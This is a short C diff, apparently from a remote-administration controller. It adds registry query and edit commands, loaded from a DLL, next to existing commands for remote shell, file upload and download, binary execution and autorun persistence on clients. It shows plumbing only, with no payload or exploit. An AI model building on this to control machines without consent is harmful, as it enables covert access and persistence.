@@ -40,6 +40,8 @@ CmdDownloadFileFrom _CmdDownloadFileFrom = NULL;
 CmdExecuteBinary _CmdExecuteBinary = NULL;
 CmdSystemShell _CmdSystemShell = NULL;
 CmdFileOperation _CmdFileOperation = NULL;
+CmdQueryRegistry _CmdQueryRegistry = NULL;
+CmdRegistryOperation _CmdRegistryOperation = NULL;
 CmdAddAutoRunBin _CmdAddAutoRunBin = NULL;
 CmdDelAutoRunBin _CmdDelAutoRunBin = NULL;
 CmdQueryAutoRunBin _CmdQueryAutoRunBin = NULL;
@@ -74,6 +76,8 @@ BOOLEAN InitializeApis()
 		_CmdExecuteBinary = (CmdExecuteBinary)GetProcAddress(hMod, "CmdExecuteBinary");
 		_CmdSystemShell = (CmdSystemShell)GetProcAddress(hMod, "CmdSystemShell");
 		_CmdFileOperation = (CmdFileOperation)GetProcAddress(hMod, "CmdFileOperation");
+		_CmdQueryRegistry = (CmdQueryRegistry)GetProcAddress(hMod, "CmdQueryRegistry");
+		_CmdRegistryOperation = (CmdRegistryOperation)GetProcAddress(hMod, "CmdRegistryOperation");
 		_CmdAddAutoRunBin = (CmdAddAutoRunBin)GetProcAddress(hMod, "CmdAddAutoRunBin");
 		_CmdDelAutoRunBin = (CmdDelAutoRunBin)GetProcAddress(hMod, "CmdDelAutoRunBin");
 		_CmdQueryAutoRunBin = (CmdQueryAutoRunBin)GetProcAddress(hMod, "CmdQueryAutoRunBin");
@@ -83,8 +87,9 @@ BOOLEAN InitializeApis()
 		if(_init && _uninit && _ClientList && _ClientConnect && _ClientDisconnect && 
 			_ClientTest && _ClientReboot && _ClientShutdown && _ClientUpdate && _ClientConfig && 
 			_CmdQueryDirectory && _CmdUploadFileTo && _CmdDownloadFileFrom && _CmdExecuteBinary && 
-			_CmdSystemShell && _CmdFileOperation && _CmdAddAutoRunBin && _CmdDelAutoRunBin && 
-			_CmdQueryAutoRunBin && _CmdClearAutoRunBin && _UpdateServer && _UpdateClient)
+			_CmdSystemShell && _CmdFileOperation && _CmdQueryRegistry && _CmdRegistryOperation && 
+			_CmdAddAutoRunBin && _CmdDelAutoRunBin && _CmdQueryAutoRunBin && _CmdClearAutoRunBin && 
+			_UpdateServer && _UpdateClient)
 		{
 			return TRUE;
 		}
@@ -348,7 +353,6 @@ void __stdcall CreateSimpleServer
 						}
 					}
 				}
-				//Uninitialization.
 				_uninit();
 			}
 			else
